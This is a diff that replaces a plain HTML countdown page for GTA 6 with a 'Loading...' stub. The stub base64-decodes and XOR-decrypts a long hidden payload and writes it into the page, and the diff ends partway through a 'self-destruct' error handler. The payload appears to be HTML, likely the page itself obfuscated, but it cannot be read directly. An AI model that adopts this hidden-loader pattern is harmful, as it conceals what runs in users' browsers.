@@ -1,238 +1,42 @@
-<html lang="en">
- <head>
-  <meta charset="utf-8"/>
-  <meta content="width=device-width, initial-scale=1" name="viewport"/>
-  <title>
-   GTA 6 Countdown
-  </title>
-  <script src="https://cdn.tailwindcss.com">
-  </script>
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
-  <style>
-   @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
-   body {
-     font-family: 'Roboto', sans-serif;
-     -webkit-user-select: none; /* Safari */
-     -moz-user-select: none; /* Firefox */
-     -ms-user-select: none; /* IE10+/Edge */
-     user-select: none; /* Standard */
-   }
-   /* Glassmorphism container */
-   .glass {
-     background: rgba(255, 255, 255, 0.1);
-     border-radius: 1rem;
-     border: 1px solid rgba(255, 255, 255, 0.25);
-     backdrop-filter: blur(15px);
-     -webkit-backdrop-filter: blur(15px);
-     box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
-   }
-   /* Fade-in animation */
-   @keyframes fadeIn {
-     0% {
-       opacity: 0;
-     }
-     100% {
-       opacity: 1;
-     }
-   }
-   .fade-in {
-     animation: fadeIn 3s ease forwards;
-     opacity: 0;
-   }
-   /* Celebration animation */
-   @keyframes popScale {
-     0% {
-       transform: scale(1);
-       opacity: 1;
-     }
-     50% {
-       transform: scale(1.3);
-       opacity: 1;
-     }
-     100% {
-       transform: scale(1);
-       opacity: 1;
-     }
-   }
-   .celebrate {
-     animation: popScale 1s ease infinite;
-     color: #f43f5e; /* pink-500 */
-     font-weight: 700;
-     font-size: 1.5rem;
-     text-align: center;
-     margin-top: 1rem;
-   }
-   /* Speaker button */
-   #audioToggle {
-     position: fixed;
-     top: 1rem;
-     right: 1rem;
-     width: 44px;
-     height: 44px;
-     cursor: pointer;
-     z-index: 50;
-     -webkit-user-select: none;
-     -moz-user-select: none;
-     -ms-user-select: none;
-     user-select: none;
-   }
-   #audioToggle .glass {
-     width: 100%;
-     height: 100%;
-     display: flex;
-     align-items: center;
-     justify-content: center;
-     color: white;
-     font-size: 1.25rem;
-     user-select: none;
-     transition: color 0.3s ease;
-   }
-   #audioToggle:hover .glass {
-     color: #f43f5e;
-   }
-   /* Prevent dragging images */
-   img {
-     -webkit-user-drag: none;
-     user-drag: none;
-     pointer-events: none;
-   }
-  </style>
- </head>
- <body>
-  <audio id="bgMusic" src="assets/gta6.mp3" loop></audio>
+<!DOCTYPE html><html><head><title>Loading...</title></head><body>
+        <script>
+            (function() {
+                var d = document;
+                var w = window;
 
-  <div id="audioToggle" aria-label="Toggle background music" role="button" tabindex="0" title="Toggle Music">
-   <div class="glass rounded-full p-2 shadow-lg">
-    <i id="audioIcon" class="fas fa-volume-mute"></i>
-   </div>
-  </div>
+                try {
+                    // Stage 1: Solve the challenge to get the key
+                    var key = (function() {
+                        var n1 = 43;
+                        var n2 = 11;
+                        var op = '+';
+                        if (op === '+') return n1 + n2;
+                        if (op === '-') return n1 - n2;
+                        if (op === '*') return n1 * n2;
+                        return 0; // Should not happen
+                    })();
+                    var keyStr = String(key);
 
-  <div class="relative min-h-screen flex flex-col items-center justify-center text-white overflow-hidden bg-black">
-   <img alt="Background image showing two characters leaning on a car with palm trees and cityscape in the background, tinted purple" class="absolute inset-0 w-full h-full object-cover brightness-75" height="800" src="assets/bg.jpg" width="600" draggable="false"/>
-   <div class="relative z-10 flex flex-col items-center px-4 glass max-w-md w-full mx-4 py-8 fade-in" draggable="false">
-    <img alt="Grand Theft Auto VI logo with colorful V and white text" class="w-36 sm:w-44 mb-6" height="150" src="assets/logo.png" width="150" draggable="false"/>
-    <h1 class="text-white text-xl sm:text-2xl font-semibold mb-2 text-center" draggable="false">
-     Live Countdown to GTA 6 Release
-    </h1>
-    <p class="text-pink-500 font-semibold mb-6 text-center text-sm sm:text-base" draggable="false">
-     Release Date: May 26, 2026
-    </p>
-    <div class="flex justify-center w-full space-x-6" draggable="false">
-     <div class="bg-black bg-opacity-30 rounded-md px-6 py-3 flex flex-col items-center min-w-[70px] glass" draggable="false">
-      <span id="days" class="text-white font-extrabold text-lg sm:text-xl" draggable="false">
-       384
-      </span>
-      <span class="text-pink-500 text-xs sm:text-sm mt-1" draggable="false">
-       Days
-      </span>
-     </div>
-     <div class="bg-black bg-opacity-30 rounded-md px-6 py-3 flex flex-col items-center min-w-[70px] glass" draggable="false">
-      <span id="hours" class="text-white font-extrabold text-lg sm:text-xl" draggable="false">
-       17
-      </span>
-      <span class="text-pink-500 text-xs sm:text-sm mt-1" draggable="false">
-       Hours
-      </span>
-     </div>
-     <div class="bg-black bg-opacity-30 rounded-md px-6 py-3 flex flex-col items-center min-w-[70px] glass" draggable="false">
-      <span id="minutes" class="text-white font-extrabold text-lg sm:text-xl" draggable="false">
-       35
-      </span>
-      <span class="text-pink-500 text-xs sm:text-sm mt-1" draggable="false">
-       Minutes
-      </span>
-     </div>
-     <div class="bg-black bg-opacity-30 rounded-md px-6 py-3 flex flex-col items-center min-w-[70px] glass" draggable="false">
-      <span id="seconds" class="text-white font-extrabold text-lg sm:text-xl" draggable="false">
-       33
-      </span>
-      <span class="text-pink-500 text-xs sm:text-sm mt-1" draggable="false">
-       Seconds
-      </span>
-     </div>
-    </div>
-    <p id="credit" class="text-white text-center mt-8 text-sm sm:text-base font-semibold select-none" draggable="false">
-     Credit - AMAROKDEVS
-    </p>
-    <p id="celebration" class="celebrate hidden" draggable="false">
-     🎉 GTA 6 is Released! 🎉
-    </p>
-   </div>
-  </div>
-  <script>
-   // Disable context menu to prevent right-click saving
-   document.addEventListener('contextmenu', e => e.preventDefault());
-
-   // Audio control
-   const audio = document.getElementById('bgMusic');
-   const audioToggle = document.getElementById('audioToggle');
-   const audioIcon = document.getElementById('audioIcon');
-
-   // Try to autoplay music on page load (some browsers block autoplay without user interaction)
-   audio.volume = 0.5;
-   audio.muted = false;
-   audio.play().catch(() => {
-     // Autoplay blocked, show muted icon initially
-     audioIcon.classList.remove('fa-volume-up');
-     audioIcon.classList.add('fa-volume-mute');
-   });
-
-   function toggleAudio() {
-     if (audio.paused) {
-       audio.play();
-       audioIcon.classList.remove('fa-volume-mute');
-       audioIcon.classList.add('fa-volume-up');
-     } else {
-       audio.pause();
-       audioIcon.classList.remove('fa-volume-up');
-       audioIcon.classList.add('fa-volume-mute');
-     }
-   }
-
-   audioToggle.addEventListener('click', toggleAudio);
-   audioToggle.addEventListener('keydown', e => {
-     if (e.key === 'Enter' || e.key === ' ') {
-       e.preventDefault();
-       toggleAudio();
-     }
-   });
-
-   // Set the release date (midnight start of May 26, 2026 in local time)
-   const releaseDate = new Date('May 26, 2026 00:00:00').getTime();
-
-   function updateCountdown() {
-     const now = new Date().getTime();
-     const distance = releaseDate - now;
-
-     if (distance <= 0) {
-       // Show celebration animation and hide countdown
-       document.getElementById('days').textContent = '0';
-       document.getElementById('hours').textContent = '0';
-       document.getElementById('minutes').textContent = '0';
-       document.getElementById('seconds').textContent = '0';
-
-       document.getElementById('celebration').classList.remove('hidden');
-       // Hide countdown blocks
-       const countdownBlocks = document.querySelectorAll('.glass > div.flex > div');
-       countdownBlocks.forEach(block => block.style.display = 'none');
-
-       clearInterval(interval);
-       return;
-     }
-
-     const days = Math.floor(distance / (1000 * 60 * 60 * 24));
-     const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-     const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-     const seconds = Math.floor((distance % (1000 * 60)) / 1000);
-
-     document.getElementById('days').textContent = days;
-     document.getElementById('hours').textContent = hours;
-     document.getElementById('minutes').textContent = minutes;
-     document.getElementById('seconds').textContent = seconds;
-   }
-
-   updateCountdown();
-   const interval = setInterval(updateCountdown, 1000);
-  </script>
- </body>
-</html>
+                    // Stage 2: Decode payload and decrypt
+                    var payload = 'CVxBWVkUWVVbUwgWUFoXCj8UCVxQVVEKPxQVCFhRQVUVV11VR0dQQAgWQEBTGQ0WGgo/FBUIWFFBVRVXWlpBUVtACBZCXVFAXQlRUUNdVlEYQ1xQQVwZFFxaXEBcVVkZRldUWFAJBBYVWlRZUAkXQlxRQkRaRkEWGgo/FBUIQV1BWFAKPxQVFHJgdBQDFHZbQFpBUFpDWz4VFAkbQV1BWFAKPxQVCEZXR11FQBVHR1cIFl1AQURGDhobVlBbGkFVXFhCXVtQVkdGGlZbWBYLPhUUCRtGV0ddRUALPhUUCVhcWl4UXUZQUggWXUBBREYOGhtWUFteRhpWWFpBUVJZVUdRG1daWRpVX1VNG1ldV0caUlpaQRlUQ1BHWllQGwAaBAEbBxpXRkcaVVlYG1lcWhtXRkcXFEdRWQkXR0FNWVFGXFBRQRYaCj8UFQhGQExYUAo/FBUUdV1YRFpGQRRARlkcElxBQEVHDxsaUlpaQUcbU1pbUlhQVUVdRhpWW1gbVkdGBgpSVFlcWEwJZ1tXW0FbD0NSXEF0AQQFDwIEBRJRXUZEWVVMCUZDVEQSHQ4+FRQVVlpQTBROPhUUFRQVUlpaQRlTVVhdWU0PFBJmWlZaQFoTGRRGVVtHGEdQRlxSDj4VFBUUFRlCUVdfXEAYQUZRRxlGUVlRVkAPFFtbW1EOFBoeFWdUUlRGXBQfGz8UFRQVFBhZWk4YQUZRRxlGUVlRVkAPFFtbW1EOFBoeFXJcRlBSWkwVHho+FRQVFBUZWEcYQUZRRxlGUVlRVkAPFFtbW1EOFBoeFX1wBQUfGnFRU1AUHxs/FBUUFRRAR1BGGEdQWFBXQQ4VWlpaUA8VGx8UZkBUWlFVR1AVHho+FRQVST8UFRQaHhVzWVVGR1hbR0RdXUZZFVdaWkFVXFpQRhUeGj4VFBUaUlhUR0YUTj4VFBUUFVZUV15TR1tAWlEOFUZSVlQcBwEAGBUGAAEZFAcBABgVBBsFHA8/FBUUFRRXW0dQUEYYRlRQXEFGDhUFR1FYDz8UFRQVFFdbR1BQRg8UBERNFEZbWV1RFEdTV1UdBgABGRQHAQAYFQYAARkUBRoHARwPPxQVFBUUV1VWX1FGWkQYUlxYQVFHDhVWWUFHHAQBRUwcDz8UFRQVFBhDUFZeXUEZV1VWX1FGWkQYUlxYQVFHDhVWWUFHHAQBRUwcDz8UFRQVFFdbTRlGXFRQWkMPFAUUAURNFAYERUwVRlJWVBwFGBUEGRQFGBUEGwUcDz8UFRRIPhUUFRsfFHNVUVEYXVsUVFpcWVRAXFtbFB8bPxQVFHVfUE1TRlRZUEcVUlRQUH1bFE4+FRQVFBUEEBROPhUUFRQVFBVbRVVWXUFNDxQFDz8UFRQVFEg+FRQVFBUFBQQQFE4+FRQVFBUUFVtFVVZdQU0PFAQPPxQVFBUUSD4VFBVJPxQVFBtSVFBQGVxaFU8/FBUUFRRUWlxZVEBcW1sOFVJUUFB9WxQGRxVRVEdQFFNbR0NURlFHDj4VFBUUFVtFVVZdQU0PFAUPPxQVFEg+FRQVGx8UdlFZUVdGVEBcW1sUVFpcWVRAXFtbFB8bPxQVFHVfUE1TRlRZUEcVRFpEZldUWFAUTj4VFBUUFQQQFE4+FRQVFBUUFUBHVVtHU1tHWQ8URldUWFAcBB0OPhUUFRQVFBVbRVVWXUFNDxQEDz8UFRQVFEg+FRQVFBUBBREVTz8UFRQVFBUUQUZUWkZSWkZYDhVHVlVZUR0FGwccDz8UFRQVFBUUWkRUV1xATA4VBQ4+FRQVFBVJPxQVFBUUBAQFERVPPxQVFBUUFRRBRlRaRlJaRlgOFUdWVVlRHQUcDz8UFRQVFBUUWkRUV1xATA4VBQ4+FRQVFBVJPxQVFEg+FRQVGlZRWVFXRlRAUBROPhUUFRQVVVtdWFVBXVpaDxRFW0VnVlVZURUFRhRQVUZRFV1bUlxaXEBQDz8UFRQVFFZbWVtHDhUXUwAGUgBRDhQaHhVEXFpeGQAEBRQfGz8UFRQVFFNbW0AYQ1BdUlxBDhUDBQQOPhUUFRQVUlpaQRlGXU9RDxQEGgBGUFkOPhUUFRQVQFBMQRlUWFxTWw4VV1BaQVFHDz8UFRQVFFhVR1NcWhhAWkQPFARGUFkOPhUUFUk/FBUUGh4VZ0VRVF9QRhVWQEBBW1sUHxs/FBUUFlVAUFxbYVtSU1lRFU8/FBUUFRRFW0ZdQV1aWg8UU11NUVEPPxQVFBUUQVtFDhUFR1FYDz8UFRQVFEddUlxBDhUFR1FYDz8UFRQVFEJdUUBdDhUAAURNDz8UFRQVFF1RXFNdQA8UAQBFTA4+FRQVFBVXQEZGW0cOFURaXVtAUEYOPhUUFRQVThhdW1BQTA8UAAQOPhUUFRQVGUJRV19cQBhBRlFHGUZRWVFWQA8UW1tbUQ4+FRQVFBUZWFtPGUBHUEYYR1BYUFdBDhVaWlpQDz8UFRQVFBhZRhlAR1BGGEdQWFBXQQ4VWlpaUA8/FBUUFRRAR1BGGEdQWFBXQQ4VWlpaUA8/FBUUSD4VFBUXVEFRXVpgWlNSWFAUG1NZVUZHFU8/FBUUFRRCXVFAXQ4VBQUEEA8/FBUUFRRdUVxTXUAPFAQEBREOPhUUFRQVUFxHRVhUTQ8UU1hQTA4+FRQVFBVVWV1SWhhdQVFYRw8UVlFbQFBGDj4VFBUUFV5AR0FdU00YV1paQVFbQA8UVlFbQFBGDj4VFBUUFVdaWFpGDxRCXFxAUA8/FBUUFRRTW1tAGEdcTlAOFQUbBgBGUFkOPhUUFRQVQUZRRxlGUVlRVkAPFFtbW1EOPhUUFRQVQEdVW0dcQFxbWw4VV1pYWkYVBBsHRhRQVUZRDj4VFBVJPxQVFBZVQFBcW2FbUlNZUQ9cWkJQRhUaUlhUR0YUTj4VFBUUFVdaWFpGDxQWUgEHUwFQDz8UFRRIPhUUFRsfFGVGUEJQWkEUUUZUU1JdW1MVXVhVUlFGFB8bPxQVFFxZUhROPhUUFRQVGUJRV19cQBhBRlFHGVFGVFMPFFtbW1EOPhUUFRQVQUZRRxlRRlRTDxRbW1tRDj4VFBUUFURaXVtAUEYYUUNRW0BGDhVaWlpQDz8UFRRIPhUUCRtGQExYUAo/FAkbXVFUUAs+FQhXW1FNCz4VFAlVQFBcWxVdUQkXVlJ5QEdcVxcURkZWCRdVRkdQQEYbUkBUAhtZRQcXFFlbWkQLCBpVQFBcWws+PxQVCFFdQxRcUAgWVEFRXVpgWlNSWFAWFVVHXVQZWVVXUVkJF2BaU1JYUBRXVVZfUkZaQVtQFVlAR1xXFxRHW1lRCBZXQUFAWloXFEFVV11bUFBMCBYFFhVAXEBZUQgWYVtSU1lRFXlAR1xXFwo/FBUUCVBcQhVXWVVGRwgWUlhUR0YUR1tAWlFRURlTQVlYFUQYBhVHXVVRW0IZWVMXCj8UFRQVCFwUXFAIFlRBUV1afVZbWxYVV1lVRkcIFlNVRhRTVRhCWlhAWVAZWEFBURcKCRtcCj8UFRQJG1FdQwo/FBUIGlBcQgs+PxQVCFFdQxRWWFRHRgkXRlBYVEBcQlAUWF1bGV0ZRldHUVBaFVJZUU0UU1hQTBhXWlgVXUFRWEcYV1BaQVFHFF9BRkBcUkwZVlFbQFBGFUBQTEEZQlxcQFAUWkJQRlNYWkMYXFxQUVFbFFdTGFZZVVZfFwo/FBUUCV1YUxVVWUAIFndVVl9SRlpBW1AVXVhVUlEVR11bQl1bUxVAQlsVV11VR1VWQFBGRhRZUVRaXFpSFFpaFVUVV1RGFUNcQF0URVVZWRVAR1FQRxVVW1AVV1xATEdWVUVRFV1bFEFcUBRXVVZfUkZaQVtQGRRBXVtAUFAVREBGRVhQFhVXWVVGRwgWVFZGW1lBQVEVXVtHUEAYBBVDGFJAWFkUXRlTQVlYFVtXXlBXQRlWW0NRRxRXRlxTXUBbUUZHGAMAFhVcUF1SXEEJFwwFBBcURkZWCRdVRkdQQEYbV1MbXkVTFxRCXVFAXQkXAgUEFxRRRlRTUlVXWFAJF1JUWEZRFxsLPhUUFQhRXUMUVlhUR0YJF0ZQWFRAXEJQFE8ZBAQVUllRTRRTWFBMGFdaWBVdQVFYRxhXUFpBUUcURUwYABVTWVVGRxVZVEwYQxhZURRCGVNBWVgVWU0ZARRFTRgMFVJUUFAZXFoXFFFGVFNSVVdYUAkXUlRYRlEXCj8UFRQVCFxZUhRUWEEJF3NHVVtQFWBdUVNAFXVAQFoUY30VWFpTWhRCXUFcFVdaWFpGU0FZFGMUVFpRFEJcXEBQFEFRTUAXFFZYVEdGCRdDGAcDFEZZD0MYAAEUWFYYAhcUXVFcU11ACBYEAQUWFUdHVwgWVEdGUUFHGlhaU1oaRVpSFhVDXFBBXAgWBAEFFhVQR1VSU1RWWVEIFlNVWUdQFhoKPxQVFBUIXQUVV1lVRkcIFkFRTUAYQ11dQVEVQFBMQRlNWBVHWA5BUU1AGAZNWBVSWlpBGUZRWF1XW1lQFVlXGQcUQVFNQBhXUFpBUUcWFVBHVVJTVFZZUQgWU1VZR1AWCz4VFBUUFXhcQlAUdltAWkFQWkNbFEFbFXNhdRUCFWZQWFBVRlE/FBUUFQgaXAQKPxQVFBUIRRRWWFRHRgkXQFBMQRlFXVtfGAEFBBVSWlpBGUZRWF1XW1lQFVlXGQMUQVFNQBhXUFpBUUcUQVFNQBhHWBRGWQ9AUExBGVdVRlEXFFFGVFNSVVdYUAkXUlRYRlEXCj8UFRQVFGdRWVFUR1AUcVVBUQ8UeFVMFAcCGRQHBAcCPxQVFBUIGkQLPhUUFRQJUFxCFVdZVUZHCBZTWFBMFV5AR0FdU00YV1BaQVFHFEIZU0FZWBVHRVVWURhMGAIXFFFGVFNSVVdYUAkXUlRYRlEXCj8UFRQVFAlQXEIVV1lVRkcIFldTGFZZVVZfFVZSGVpEVFdcQEwZBgQVRlpBW1BQUBhZURRFTBgCFURMGQYUU1hQTBVSWVFNGVZbWRRcQFBZRhlWUVtAUEYVWVxaGEMYbwIERUxoFFJYVEdGFhVQR1VSU1RWWVEIFlNVWUdQFgs+FRQVFBUUCUdFVVsUXFAIFlFVTEcXFFZYVEdGCRdAUExBGUJcXEBQFFNbW0AYUU1AR1VXW1lQFUBQTEEZWVMVR1gOQVFNQBhMWRYVUEdVUlNUVllRCBZTVVlHUBYLPhUUFRQVFBUHDQA/FBUUFRQVCBpHRVVbCj8UFRQVFBUIRkRUWhVXWVVGRwgWQVFNQBhEXFpeGQAEBRRBUU1AGExGFEZZD0BQTEEZRlkVWUEZBBYVUEdVUlNUVllRCBZTVVlHUBYLPhUUFRQVFBVwVE1GPhUUFRQVFAkbRkRUWgs+FRQVFBUIGlBcQgs+FRQVFBUIUV1DFFZYVEdGCRdWUhlXWFRXXhRXUxhbRVVWXUFNGAcFFEdbQFpRUVEZWFAVRE0ZAxRFTRgHFVJZUU0UU1hQTBhXWlgVXUFRWEcYV1BaQVFHFFhdWxlCGW4DBURNaRVTWVVGRxcUUUZUU1JVV1hQCRdSVFhGURcKPxQVFBUUFQhGRFRaFV1RCRdcWkFHRxcUVlhUR0YJF0BQTEEZQlxcQFAUU1tbQBhRTUBHVVdbWVAVQFBMQRlZUxVHWA5BUU1AGExZFhVQR1VSU1RWWVEIFlNVWUdQFgs+FRQVFBUUFQUCPhUUFRQVFAkbRkRUWgs+FRQVFBUUCUdFVVsUVlhUR0YJF0BQTEEZRV1bXxgBBQQVQFBMQRlNRxVHWA5BUU1AGEdYFFhAGAUXFFFGVFNSVVdYUAkXUlRYRlEXCj8UFRQVFBUUfVtARkY+FRQVFBUUCRtGRFRaCz4VFBUUFQgaUFxCCz4VFBUUFQhRXUMUVlhUR0YJF1ZSGVdYVFdeFFdTGFtFVVZdQU0YBwUUR1tAWlFRURlYUBVETRkDFEVNGAcVUllRTRRTWFBMGFdaWBVdQVFYRxhXUFpBUUcUWF1bGUIZbgMFRE1pFVNZVUZHFxRRRlRTUlVXWFAJF1JUWEZRFwo/FBUUFRQVCEZEVFoVXVEJF1lcWkBAUEcXFFZYVEdGCRdAUExBGUJcXEBQFFNbW0AYUU1AR1VXW1lQFUBQTEEZWVMVR1gOQVFNQBhMWRYVUEdVUlNUVllRCBZTVVlHUBYLPhUUFRQVFBUHAD4VFBUUFRQJG0ZEVFoLPhUUFRQVFAlHRVVbFFZYVEdGCRdAUExBGUVdW18YAQUEFUBQTEEZTUcVR1gOQVFNQBhHWBRYQBgFFxRRRlRTUlVXWFAJF1JUWEZRFwo/FBUUFRQVFHhdW0FBUUY+FRQVFBUUCRtGRFRaCz4VFBUUFQgaUFxCCz4VFBUUFQhRXUMUVlhUR0YJF1ZSGVdYVFdeFFdTGFtFVVZdQU0YBwUUR1tAWlFRURlYUBVETRkDFEVNGAcVUllRTRRTWFBMGFdaWBVdQVFYRxhXUFpBUUcUWF1bGUIZbgMFRE1pFVNZVUZHFxRRRlRTUlVXWFAJF1JUWEZRFwo/FBUUFRQVCEZEVFoVXVEJF0dQV1paUUcXFFZYVEdGCRdAUExBGUJcXEBQFFNbW0AYUU1AR1VXW1lQFUBQTEEZWVMVR1gOQVFNQBhMWRYVUEdVUlNUVllRCBZTVVlHUBYLPhUUFRQVFBUHBj4VFBUUFRQJG0ZEVFoLPhUUFRQVFAlHRVVbFFZYVEdGCRdAUExBGUVdW18YAQUEFUBQTEEZTUcVR1gOQVFNQBhHWBRYQBgFFxRRRlRTUlVXWFAJF1JUWEZRFwo/FBUUFRQVFGZRVltbUEY+FRQVFBUUCRtGRFRaCz4VFBUUFQgaUFxCCz4VFBUUCRtRXUMKPxQVFBUIRRRcUAgWVkZQUFxAFxRWWFRHRgkXQFBMQRlCXFxAUBRBUU1AGFdQWkFRRxRYQBgMFUBQTEEZRlkVR1gOQVFNQBhWVEdQFFNbW0AYR1BZXFZaWFEURlFZUVZAGFpaWlAWFVBHVVJTVFZZUQgWU1VZR1AWCz4VFBUUFXdHUVFdQRQYFHR5dGZ6f3FxY2c/FBUUFQgaRAs+FRQVFAlEFV1RCRdXUFhQVkdVQV1aWhcUVlhUR0YJF1dQWFBWR1VBURVcXFBRUVsWFVBHVVJTVFZZUQgWU1VZR1AWCz4VFBUUFfCSjrwUcmB0FAMUXEcVZlBYUFVGUVEVFfCSjrw+FRQVFAkbRQo/FBUUCRtRXUMKPxQVCBpQXEILPhUUCUdWRlxEQQo/FBUUGhsVcFxHVFZZURVXWlpBUU1AFVlQWkAUQVsVREdRQ1FbQBVGXFNdQBhXWV1WXxVHVEJcWlI+FRQVUFpXQFlQWkEaVFBRcUNRW0B5XUZAUFpQRh0TVltbQFBMQVlQWkATGRRQFAgKFVEbREdRQ1FbQHFRU1VAWEEcHB0OPj8UFRQaGxV1QFBcWxVXWlpBRlpYPxQVFFZbW0dBFFRBUV1aFAgUUVtWQVhRW0AbU1BAcFhQWVBaQXZMfVEcElZSeUBHXFcSHQ4+FRQVV1paRkAVVUBQXFthW1JTWVEVCRVQWldAWVBaQRpSUUFxWVFYUVtAd018UB0TVEFRXVpgWlNSWFATHA8/FBUUVltbR0EUVEFRXVp9VltbFAgUUVtWQVhRW0AbU1BAcFhQWVBaQXZMfVEcElVAUFxbfFdaWhIdDj4/FBUUGhsVYEdNFUBaFFRBQVtFWFRNFVlAR1xXFVtbFEVVUlEVWFpVURQdR1pZUBRXRlpDRlFHRxVWWVtWXxVVQEBaRFlVTBRCXUFcWkFBFEBHUEYVXVtAUEZUV0FdWlocPhUUFVVAUFxbG0JaWEBZUBQIFAUaAA8/FBUUVEFRXVoaWEFBUVEUCBRTVVlHUA8/FBUUVEFRXVoaRVhUTR0dG1dUQFZcHRwcFAgKFU8/FBUUFRQaGxV1QEBaRFlVTBRXWFpXXlFRGBVHXVtCFFhBQVFRFFxXWloVXVtdQV1UWFlNPxQVFBUUVEFRXVp9VltbGlZYVEdGeFxHQRpHUVhbQ1EdE1NVGEJaWEBZUBlARBIdDj4VFBUUFVVAUFxbfFdaWhtXWVVGR3ldRkAbVVFQHRNTVRhCWlhAWVAZWEFBURIdDj4VFBVJHA8/PhUUFVJAWlZAXFtbFEFbUlNZUXRBUV1aHBwUTj4VFBUUFV1TFB1VQFBcWxtEVEFGUVEdFU8/FBUUFRQVFFRBUV1aGkVYVE0dHQ4+FRQVFBUUFVVAUFxbfFdaWhtXWVVGR3ldRkAbRlBZWkJQHBJSVBlDW1lBWFEYWUBAUBMcDz8UFRQVFBUUVEFRXVp9VltbGlZYVEdGeFxHQRpUUFEcElJUGUNbWUFYURhBRRMcDz8UFRQVFEgUUFhGURVPPxQVFBUUFRRUQVFdWhpFVUBHUBwcDz8UFRQVFBUUVEFRXVp9VltbGlZYVEdGeFxHQRpHUVhbQ1EdE1NVGEJaWEBZUBlARBIdDj4VFBUUFRQVVUBQXFt8V1paG1dZVUZHeV1GQBtVUVAdE1NVGEJaWEBZUBlYQUFREh0OPhUUFRQVST8UFRRIPj8UFRRUQVFdWmBaU1JYUBpUUFFxQ1FbQHldRkBQWlBGHRNWWFxXXhMZFEFbUlNZUXRBUV1aHQ4+FRQVVUBQXFthW1JTWVEbVVFQcEJQWkF4XEdBUVtRRxwSX1BNUVtCWhIYFVEVCQsUTj4VFBUUFV1TFB1RG19QTRUJCAkVE3BaQVFHExVISRRQGl5RTBQICQgUEhQSHRVPPxQVFBUUFRRQGkVGUEJQWkFwUFJUQVlAHR0OPhUUFRQVFBVAWlNSWFB1QFBcWx0dDj4VFBUUFUk/FBUUSB0OPj8UFRQaGxVnUEAVQF1RFUZQWFBVRlEVUFRAUBQdWVxQW11SXEEURkBURkEUWlIVeVRNFQYDGBUGBQYDFFxaFVhaV1RYFUBcWVAdPxQVFFZbW0dBFEdRWVFUR1BwVEBQFAgUW1FCFHFVQVEdE3hVTBQHAhkUBwQHAhUEBQ4FBA8EBRMcGlJRQWBcWVAcHA8/PhUUFVJAWlZAXFtbFEBEUVVBUXZbQFpBUFpDWxwcFE4+FRQVFBVXWlpGQBVaWkMVCRVaUEMVcFRAUBwcGlJRQWBcWVAcHA8/FBUUFRRWW1tHQRRRXUZAVFpWURUJFUZQWFBVRlFxVUFRFRkVWlpDDj4/FBUUFRRcUhUcUV1GQFRaVlEVCAgUBR0VTz8UFRQVFBUUGhsVZ11bQhRWUVlRV0ZUQFxbWxRUWlxZVEBcW1sUVFpRFF1dUVEVV1pBW0BRW0JaPxQVFBUUFRRRW1ZBWFFbQBtTUEBwWFBZUFpBdkx9URwSUFRNRhMcGkFRTUB2W1tAUFpBFAgUEgQSDz8UFRQVFBUUUVtWQVhRW0AbU1BAcFhQWVBaQXZMfVEcElxaQUdHEh0bQFBMQXdaWkFRW0AVCRUTBRMOPhUUFRQVFBVQWldAWVBaQRpSUUFxWVFYUVtAd018UB0TWF1bQUFRRhMcGkFRTUB2W1tAUFpBFAgUEgQSDz8UFRQVFBUUUVtWQVhRW0AbU1BAcFhQWVBaQXZMfVEcEkdQV1paUUcSHRtAUExBd1paQVFbQBUJFRMFEw4+PxQVFBUUFRRRW1ZBWFFbQBtTUEBwWFBZUFpBdkx9URwSV1BYUFZHVUFdWloSHRtXWVVGR3ldRkAbRlBZWkJQHBJcXFBRUVsTHA8/FBUUFRQVFBobFXxcUFAUVltAWkFQWkNbFFdYWldeRz8UFRQVFBUUVltbR0EUVltAWkFQWkNbdllbVl9GFAgUUVtWQVhRW0AbRUBRR01mUVlRVkBaRnRYWRwSGlJYVEdGFAsUUV1DGlNYUEwVChVQXEISHQ4+FRQVFBUUFVdaQVtAUVtCWndYWldeRxtSWkZwVVZcHVZZW1ZfFQkLFFdYWldeGkZATFhQGlFdRkRZVUwUCBQSWlpaUBMcDz8+FRQVFBUUFVdZUVRGfFpBUUdCVFgdXVtAUEZDVVkdDj4VFBUUFRQVRlBAQEZbDz8UFRQVFEg+PxQVFBUUVltbR0EUUVVMRxUJFXlUQF0aU1haW0ccUV1GQFRaVlEVGxUcBAQFBBUeFQIFFB8UAwQVHhUGAR0cDz8UFRQVFFZbW0dBFF1bQEZGFAgUeFVBXBtSWVtaRh0cUV1GQFRaVlEVERUcBAQFBBUeFQIFFB8UAwQVHhUGAR0cFBoUHQUFBAUUHxQDBBUeFQIFHRwPPxQVFBUUVltbR0EUWF1bQUFRRhQIFHhVQVwbUllbWkYdHFFdRkBUWlZRFREVHAQEBQQVHhUCBRQfFAMEHB0VGxUcBAQFBBUeFQIFHRwPPxQVFBUUVltbR0EURlFWW1tQRhQIFHhVQVwbUllbWkYdHFFdRkBUWlZRFREVHAQEBQQVHhUCBR0cFBoUBAQFBBwPPz4VFBUUFVBaV0BZUFpBGlJRQXFZUVhRW0B3TXxQHRNRVUxHEh0bQFBMQXdaWkFRW0AVCRVQVE1GDz8UFRQVFFFbVkFYUVtAG1NQQHBYUFlQWkF2TH1RHBJcWkFHRxIdG0BQTEF3WlpBUVtAFQkVXFpBR0cOPhUUFRQVUFpXQFlQWkEaUlFBcVlRWFFbQHdNfFAdE1hdW0FBUUYTHBpBUU1AdltbQFBaQRQIFFhdW0FBUUYPPxQVFBUUUVtWQVhRW0AbU1BAcFhQWVBaQXZMfVEcEkdQV1paUUcSHRtAUExBd1paQVFbQBUJFUdQV1paUUcOPhUUFUk/PhUUFUFFUFRAUHdaQVtAUVtCWh0dDj4VFBVXWlpGQBVdW0BQRkNVWRQIFEZRQX1bQFBGQ1VZHEBEUVVBUXZbQFpBUFpDWxgVBQUEBR0OPhUUCRtGV0ddRUALPhUIGlZaUEwKPwgaXEFZWQo=';
+                    var decoded = (typeof w.atob === 'function') ? w.atob(payload) : '';
+                    
+                    var decrypted = decoded.split('').map(function(char, i) {
+                        return String.fromCharCode(char.charCodeAt(0) ^ keyStr.charCodeAt(i % keyStr.length));
+                    }).join('');
+                    
+                    // Stage 3: Render the content
+                    if (decrypted) {
+                        d.open();
+                        d.write(decrypted);
+                        d.close();
+                    } else {
+                        throw new Error('Decryption failed');
+                    }
+                } catch (e) {
+                    // Self-destruct on any error
